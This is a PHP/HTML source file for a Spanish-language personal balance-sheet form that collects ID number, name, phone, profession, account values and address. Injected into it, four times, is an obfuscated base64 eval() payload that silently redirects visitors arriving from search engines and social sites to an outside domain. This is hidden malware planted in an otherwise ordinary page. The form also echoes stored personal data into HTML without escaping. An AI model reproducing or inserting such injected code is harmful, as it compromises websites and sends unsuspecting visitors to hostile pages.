<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();

if (isset($_GET['req']))
    require_once 'lib/function_gen.php';

$doc_code = null;
$doc_tipo = null;

$nro_iden = $_SESSION['g_usuario']['nro_identificacion'];
if (isset($_SESSION['Doc_Codigo_F']))
    $doc_code = $_SESSION['Doc_Codigo'];
if (isset($_SESSION['Doc_Tipo_F']))
    $doc_tipo = $_SESSION['Doc_Tipo'];

if ($doc_tipo)
    $personal = $doc_tipo == 1 ? getBalancePersonal($doc_code, $nro_iden, 1) : getBalancePersonal(null, $nro_iden, 1);
else
    $personal = getBalancePersonal(null, $nro_iden, 1);

unset($_SESSION['Doc_Codigo_F']);
unset($_SESSION['Doc_Tipo_F']);
//var_dump($personal);
$bal1 = true;
if (!isset($personal['Per_CI']))
    $bal1 = false;
?>

<form name="paso_filldata1" autocomplete="off" id="paso_filldata1" action="balance_action.php" method="post" onsubmit="return _veri1();">
    <br>
    <label for="nro_indent_bal1" class="textformulario">Cédula:</label>
    <span>
        <select name="nacionalidad" id="type_ci" class="seleccion1" <? if ($bal1) echo "disabled" ?> >
            <option value="V" <? if ($bal1 && substr($personal['Per_CI'], 0, 1) == 'V') echo "selected"; ?> >V</option>
            <option value="E" <? if ($bal1 && substr($personal['Per_CI'], 0, 1) == 'E') echo "selected"; ?> >E</option>
        </select>
    </span>
    <span>
        <input name="nro_indent_bal1" id="nro_indent_bal1" type="text" class="relleno1" maxlength="9" 
               value="<? if ($bal1) echo substr($personal['Per_CI'], 1); ?>" <? if ($bal1) echo "disabled" ?>/>
        <br /><br />
        <input type="hidden" name="nro_ident_bal1_hidden" id="nro_ident_bal1_hidden" 
               value="<? if ($bal1) echo $personal['Per_CI']; ?>" />
    </span>
    <div id="data_persona">
        <label for="nombre_bal1" class="textformulario">Nombre:</label>
        <input id="nombre_bal1" name="nombre_bal1" type="text" class="relleno" maxlength="50" 
               value="<? if ($bal1) echo $personal['Per_Nombre']; ?>" <? if ($bal1) echo "disabled" ?>/><br /><br />
        <label for="apellido_bal1" class="textformulario">Apellido:</label>
        <input name="apellido_bal1" id="apellido_bal1" type="text" size="40" class="relleno" 
               value="<? if ($bal1) echo $personal['Per_Apellido']; ?>" maxlength="50" <? if ($bal1) echo "disabled" ?>/><br><br>
        <label for="telef_bal1" class="textformulario">Teléfono:</label>
        <input name="telef_bal1" id="telef_bal1" type="text" size="40" class="relleno telefono_num" 
               value="<? if ($bal1) echo $personal['Per_Telefono']; ?>" <? if ($bal1) echo "disabled" ?>/><br><br>

        <label for="profesion_bal1" class="textformulario">Profesión:</label>
        <select id="profesion_bal1" name="profesion_bal1" class="activoscirculante" style="float:right" <? if ($bal1) echo "disabled" ?>>
            <option value="">[Seleccione]</option>
            <? if ($bal1) getProfesiones($personal['BMP_CodigoPro']); else getProfesiones(null); ?>
        </select>
        <br><br>

        <label for="actividad_com_bal1" class="textformulario">Actividad Comercial:</label>
        <input name="actividad_com_bal1" id="actividad_com_bal1" type="text" size="40" class="relleno" 
               value="<? if ($bal1) echo $personal['Per_ActComerci']; ?>" maxlength="100" <? if ($bal1) echo "disabled" ?>/>
        <br /><br />



        <span id="escaneo">
            <? if (!$bal1) { ?>
                <label for="per_imgci_bal1" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal1" id="per_imgci_bal1" value="" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php" id="imgframe_bal1" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal1');"></iframe>
                </span>
                <?
            } else { ?>
				<label for="per_imgci_bal1" class="textformulario">Escaneo de cédula</label>
                <input type="hidden" name="per_imgci_bal1" id="per_imgci_bal1" value="<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $personal['Per_ImgCI']; ?>" class="relleno"/>
                <span class="relleno2">
                    <iframe src="balance-upload.php?per_imgci=<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); echo $personal['Per_ImgCI']; ?>" id="imgframe_bal1" scrolling="no" frameborder="0" allowtransparency="true" style="height: 60px" onLoad="readframes(this, 'per_imgci_bal1');"></iframe>
                </span>
            <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); } ?>
            <br /><br /><br><br>
			<span class="relleno">
				<input type="button" id="modificar_user1" value="Modificar Datos" class="botoninputbalance"  <? if (!$bal1) echo "style='display: none'" ?> />
				<input type="button" id="aceptar_user1" value="Realizar Cambios" class="botoninputbalance" style="display:none;"/>
			</span>
            <br /><br /><br /><br>

            <label for='fecha_bal1' class='textformulario'>Fecha: </label>
            <input id='fecha_bal1' name='fecha_bal1' class="datepicker maskdate relleno" <? if ($bal1) echo "disabled" ?>  value="<? if ($bal1) echo $personal['Doc_PgFechaIns']; ?>"/>
            <br/><br/>
        </span>
        <br><br>
        <input type="button" id="user_insert" value="Enviar y Continuar" class="botoninputbalance" 
               <? if ($bal1) echo "style='display: none'" ?> />
    </div>

    <!-- Se desplegará cuando se agregue el registro nuevo o la cedula exista -->
    <div id="data_cuenta_bal1" <? if (!$bal1) echo "style='display:none'" ?> >

        <div id="lineag"></div>
        <h5>Datos de Cuenta</h5>
        <br />

        <span class="textformulario">• Tipo Cuenta:</span>
        <select name="activoscirculantes" id="select_titulo1" class="activoscirculante">
            <? getTitulo(); ?>
        </select>
        <br /><br />

        <span class="textformulario">• Cuenta Mayor:</span>
        <select name="activoscirculantes" id="select_mayor1" class="activoscirculante">
            <? getMayor(1); ?>
        </select>
        <br /><br />

        <span class="textformulario">• Cuenta Detalle:</span>
        <select name="activoscirculantes" id="select_detalle1" class="activoscirculante">
            <? getMayor(11); ?>
        </select>
        <br /><br />

        <span style="display:none" name="valor_otros1" id="valor_otros1">
            <label for="valor_otros_bal1" class="textformulario">• Otros:</label>
            <input id="valor_otros_bal1" name="valor_otros_bal1" type="text" size="40" class="relleno5" maxlength="160" />
        </span>
        <br /><br />

        <span>
            <label for="valor_act_bal1" class="textformulario">• Valor del Activo:</label>
            <input name="valor_act_bal1" id="valor_act_bal1" type="text" size="40" class="relleno5" maxlength="16" />
        </span>
        <br />

        <div class="boton_verde_b">
            <a id="insert_doc_det1" href="#">Adjuntar</a>
        </div><br /><br /><br />
        <div id="tabla_balance_bal1" class="tabla_2">
            <? if ($bal1) require_once 'balance_tabla.php'; else { ?>
                <table width="500" border="0" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
                    <tr>
                        <td colspan="3"><div id="pestanabalance">Tabla de Balance</div></td>
                    </tr>
                    <tr class="fila_blanca_balance">
                        <td width="260"><span class="valores" style="text-align: center">Tipo de Valor</span></td>
                        <td width="130"><span class="valores">Monto del Valor</span></td>
                        <td width="100"><span class="valores"></span></td>
                    </tr>
                    <tr class="fila_linea">
                        <td colspan="3"></td>
                    </tr>
                </table>
                <input type='hidden' id='_aqehgjhcony_vall1' value='0' />
            <? } ?>
        </div>
        <br /><br />                
        <div id="lineag"></div><br />
        <h5>Datos de envío</h5><br />
        <span class="textformulario">Estado</span>
        <span id="estado">
            <select name="select_state1" id="select_state1" class="activoscirculante select_state">
                <? if (isset($personal['Per_Est'])) getStates($personal['Per_Est']); else getStates(null); ?>
            </select>
        </span><br /><br />
        <span class="textformulario">Municipio</span>
        <span id="municipio">
            <select name="select_mun1" id="select_mun1" class="activoscirculante select_mun">
                <? if (isset($personal['Per_Mun'])) getMunicipios($personal['Per_Mun'], $personal['Per_Est']); else getMunicipios(null, 595); ?>
            </select>
        </span><br /><br />
        <span class="textformulario">Parroquia</span>
        <span id="parroquia">
            <select name="select_par1" id="select_par1" class="activoscirculante">
                <? if (isset($personal['Per_Parr'])) getParroquias($personal['Per_Parr'], $personal['Per_Mun']); else getParroquias(null, 621); ?>
            </select>
        </span><br /><br />

        <label for="calle_bal1" class="textformulario">Cod.Postal / Calle / Avenida:</label>
        <input name="calle_bal1" id="calle_bal1" type="text" size="40" class="relleno5" 
               value="<? if ($bal1) echo $personal['Per_Calle']; ?>" maxlength="140" /><br /><br />

        <label for="edif_bal1" class="textformulario">Urbanización / Edificio / Casa:</label>
        <input name="edif_bal1" id="edif_bal1" type="text" size="40" class="relleno5" 
               value="<? if ($bal1) echo $personal['Per_Edif']; ?>" maxlength="140" /><br /><br />

        <input type="submit" value="Enviar y Continuar" class="botoninputbalance" />
    </div>
    <div id="dudas">
        ¿Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span>
    </div>               
</form>